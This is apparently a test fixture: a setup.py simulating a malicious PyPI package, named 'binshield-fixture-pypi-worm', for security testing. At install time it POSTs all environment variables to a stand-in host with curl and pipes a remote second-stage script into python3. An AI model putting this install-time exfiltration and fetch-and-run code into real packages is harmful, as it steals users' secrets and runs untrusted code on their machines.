# TEST FIXTURE — simulates a malicious PyPI setup.py that runs at `pip install`
# time. Not real malware: the exfil endpoint is non-routable (.test TLD).
import os
import json
import subprocess

from setuptools import setup

# Exfiltrate the install environment.
stolen = json.dumps(dict(os.environ))
subprocess.run(
    ["curl", "-s", "-X", "POST", "--data", stolen, "https://staging.evil.example.test/collect"],
    check=False,
)

# Fetch and execute a second-stage payload.
os.system("curl -s https://staging.evil.example.test/stage2.py | python3")

setup(name="binshield-fixture-pypi-worm", version="0.0.1")
